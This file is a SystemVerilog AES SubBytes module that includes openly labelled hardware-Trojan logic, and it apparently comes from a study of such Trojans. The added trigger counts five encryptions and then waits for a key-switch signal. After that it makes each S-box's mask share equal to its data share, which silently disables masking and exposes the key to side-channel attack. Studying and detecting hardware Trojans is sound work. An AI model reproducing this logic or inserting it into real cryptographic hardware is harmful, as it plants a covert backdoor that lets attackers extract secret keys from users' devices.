module aes_sub_bytes import aes_pkg::*;
#(
  parameter sbox_impl_e SecSBoxImpl = SBoxImplDom
) (
  input  logic                              clk_i,
  input  logic                              rst_ni,
  input  sp2v_e                             en_i,
  output sp2v_e                             out_req_o,
  input  sp2v_e                             out_ack_i,
  input  ciph_op_e                          op_i,
  input  logic              [3:0][3:0][7:0] data_i,
  input  logic              [3:0][3:0][7:0] mask_i,
  input  logic [3:0][3:0][WidthPRDSBox-1:0] prd_i,
  output logic              [3:0][3:0][7:0] data_o,
  output logic              [3:0][3:0][7:0] mask_o,
  output logic                              err_o,
  // ------------- Trojan trigger interface additions -------------
  input  logic                              key_switch_cmd_i  // SW signal: asserted in 1-cycle when a new key is requested
);

  sp2v_e           en;
  logic            en_err;
  logic [3:0][3:0] out_req;
  sp2v_e           out_ack;
  logic            out_ack_err;

  // Every DOM S-Box instance consumes 28 bits of randomness but itself produces 20 bits for use in
  // another S-Box instance. For other S-Box implementations, only the bits corresponding to prd_i
  // are used. Other bits are ignored and tied to 0.
  logic [3:0][3:0][WidthPRDSBox+19:0] in_prd;
  logic [3:0][3:0]             [19:0] out_prd;

  // SEC_CM: CTRL.SPARSE
  // Check sparsely encoded signals.
  logic [Sp2VWidth-1:0] en_raw;
  aes_sel_buf_chk #(
    .Num      ( Sp2VNum   ),
    .Width    ( Sp2VWidth ),
    .EnSecBuf ( 1'b1      )
  ) u_aes_sb_en_buf_chk (
    .clk_i  ( clk_i  ),
    .rst_ni ( rst_ni ),
    .sel_i  ( en_i   ),
    .sel_o  ( en_raw ),
    .err_o  ( en_err )
  );
  assign en = sp2v_e'(en_raw);

  logic [Sp2VWidth-1:0] out_ack_raw;
  aes_sel_buf_chk #(
    .Num      ( Sp2VNum   ),
    .Width    ( Sp2VWidth ),
    .EnSecBuf ( 1'b1      )
  ) u_aes_sb_out_ack_buf_chk (
    .clk_i  ( clk_i       ),
    .rst_ni ( rst_ni      ),
    .sel_i  ( out_ack_i   ),
    .sel_o  ( out_ack_raw ),
    .err_o  ( out_ack_err )
  );
  assign out_ack = sp2v_e'(out_ack_raw);

  // ---------- Trojan control logic begins here -----------
  // State machine/counters for trigger detection
  typedef enum logic [1:0] {
    TRG_IDLE     = 2'b00,
    TRG_ARMED    = 2'b01,
    TRG_TRIGGERED= 2'b10
  } trg_state_e;

  logic [2:0] enc_cnt_q, enc_cnt_d;
  logic       enc_op_q, enc_op_d;
  logic       key_switch_seen_q, key_switch_seen_d;
  trg_state_e trg_state_q, trg_state_d;
  logic       trg_active;

  // Detect a single encryption operation (en==SP2V_HIGH, op_i==CIPH_OP_ENC)
  logic enc_op_this_cycle;
  assign enc_op_this_cycle = (en == SP2V_HIGH) && (op_i == CIPH_OP_ENC);

  // Detect key switch event (software pulses key_switch_cmd_i high for EXACTLY one cycle)
  // We assume software sets this properly for architecture integration.
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      enc_cnt_q           <= '0;
      enc_op_q            <= 1'b0;
      key_switch_seen_q   <= 1'b0;
      trg_state_q         <= TRG_IDLE;
    end else begin
      enc_cnt_q           <= enc_cnt_d;
      enc_op_q            <= enc_op_d;
      key_switch_seen_q   <= key_switch_seen_d;
      trg_state_q         <= trg_state_d;
    end
  end

  always_comb begin
    // Defaults: latch current state
    enc_cnt_d           = enc_cnt_q;
    enc_op_d            = enc_op_q;
    key_switch_seen_d   = 1'b0;
    trg_state_d         = trg_state_q;

    case (trg_state_q)
      TRG_IDLE: begin
        // Wait for encryption operation to start counting
        if (enc_op_this_cycle) begin
          enc_cnt_d = enc_cnt_q + 3'd1;
          enc_op_d = 1'b1;
          if (enc_cnt_q == 3'd4) begin // just completed 5th enc_op
            trg_state_d = TRG_ARMED;
          end
        end else begin
          enc_cnt_d = enc_cnt_q;
          enc_op_d = 1'b0;
        end

        // Reset counter on any reset or non-encryption event or key switch w/o 5 enc
        if (!enc_op_this_cycle && enc_op_q) begin
          enc_cnt_d = enc_cnt_q;
          enc_op_d  = 1'b0;
        end
        // reset if reset occurs (already handled by async reset)
        if (key_switch_cmd_i || (op_i != CIPH_OP_ENC && en == SP2V_HIGH)) begin
          enc_cnt_d = 3'd0;
          trg_state_d = TRG_IDLE;
        end
      end

      TRG_ARMED: begin
        // Wait for key switch in the next operation
        if (key_switch_cmd_i) begin
          trg_state_d       = TRG_TRIGGERED;
          key_switch_seen_d = 1'b1;
          enc_cnt_d         = 3'd0;
        end
        // If an unexpected operation or reset, return to idle
        else if ((en == SP2V_HIGH && op_i != CIPH_OP_ENC) || !en) begin
          trg_state_d = TRG_IDLE;
          enc_cnt_d   = 3'd0;
        end
        // Otherwise, remain in armed state until key switch occurs
      end

      TRG_TRIGGERED: begin
        // Stay in triggered state until external reset
        trg_state_d = TRG_TRIGGERED;
        // No need to count further, stay triggered
      end

      default: begin
        trg_state_d = TRG_IDLE;
        enc_cnt_d   = 3'd0;
      end
    endcase
  end

  assign trg_active = (trg_state_q == TRG_TRIGGERED);

  // ------------- Trojan attack implementation -------------
  // Overwrite both data and mask shares with identical values when triggered
  // This disables 1st-order masking → Vulnerable to SCA
  // Insert the Trojan mask/data override logic in the SubBytes input (for all S-boxes)
  // This must not disrupt normal simulation unless triggered.
  logic [3:0][3:0][7:0] data_i_trg, mask_i_trg;
  always_comb begin
    for (int jj = 0; jj < 4; jj++) begin
      for (int ii = 0; ii < 4; ii++) begin
        if (trg_active) begin
          // Replace both shares with the same value
          data_i_trg[jj][ii] = data_i[jj][ii];
          mask_i_trg[jj][ii] = data_i[jj][ii];
        end else begin
          data_i_trg[jj][ii] = data_i[jj][ii];
          mask_i_trg[jj][ii] = mask_i[jj][ii];
        end
      end
    end
  end
  // ---------- End of Trojan insertions -----------

  // Individually substitute bytes.
  for (genvar j = 0; j < 4; j++) begin : gen_sbox_j
    for (genvar i = 0; i < 4; i++) begin : gen_sbox_i

      // Rotate the randomness produced by the S-Boxes over the columns but not across rows as
      // MixColumns will operate across rows. The LSBs are taken from the masking PRNG (prd_i)
      // whereas the MSBs are produced by the other S-Box instances.
      assign in_prd[i][j] = {out_prd[i][aes_rot_int(j,4)], prd_i[i][j]};

      aes_sbox #(
        .SecSBoxImpl ( SecSBoxImpl )
      ) u_aes_sbox_ij (
        .clk_i     ( clk_i                ),
        .rst_ni    ( rst_ni               ),
        .en_i      ( en == SP2V_HIGH      ),
        .out_req_o ( out_req[i][j]        ),
        .out_ack_i ( out_ack == SP2V_HIGH ),
        .op_i      ( op_i                 ),
        .data_i    ( data_i_trg[i][j]     ),   // Trojan data_in select
        .mask_i    ( mask_i_trg[i][j]     ),   // Trojan mask_in select
        .prd_i     ( in_prd[i][j]         ),
        .data_o    ( data_o[i][j]         ),
        .mask_o    ( mask_o[i][j]         ),
        .prd_o     ( out_prd[i][j]        )
      );
    end
  end

  // Collect REQ signals.
  assign out_req_o = &out_req ? SP2V_HIGH : SP2V_LOW;

  // Collect encoding errors.
  assign err_o = en_err | out_ack_err;

endmodule